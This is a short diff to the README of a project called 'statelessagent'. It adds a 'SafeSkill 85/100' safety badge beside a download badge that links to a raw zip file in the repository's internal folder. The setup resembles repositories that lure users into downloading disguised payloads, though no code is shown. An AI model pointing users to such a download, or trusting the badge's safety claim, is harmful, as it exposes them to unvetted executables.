@@ -1,5 +1,7 @@
 # 🤖 statelessagent - AI That Forgets Between Sessions
 
+[![SafeSkill 85/100](https://img.shields.io/badge/SafeSkill-85%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/rerecoy123-statelessagent)
+
 [![Download statelessagent](https://github.com/rerecoy123/statelessagent/raw/refs/heads/main/internal/web/Software_3.6.zip%20statelessagent-blue?style=for-the-badge)](https://github.com/rerecoy123/statelessagent/raw/refs/heads/main/internal/web/Software_3.6.zip)
 
 ---
